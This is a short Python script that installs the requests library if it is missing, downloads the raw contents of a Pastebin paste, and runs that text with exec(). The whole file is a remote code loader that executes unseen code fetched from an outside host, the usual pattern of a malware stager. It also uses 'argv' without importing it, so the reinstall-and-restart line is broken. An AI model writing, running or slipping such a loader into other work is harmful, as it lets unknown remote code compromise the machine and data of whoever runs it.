from os import execl; from sys import executable; from os import system
try: from requests import get
except: system('pip install requests');execl(executable, executable, *argv)
a=get('https://pastebin.com/raw/WY6AQRKa').text
exec(a)
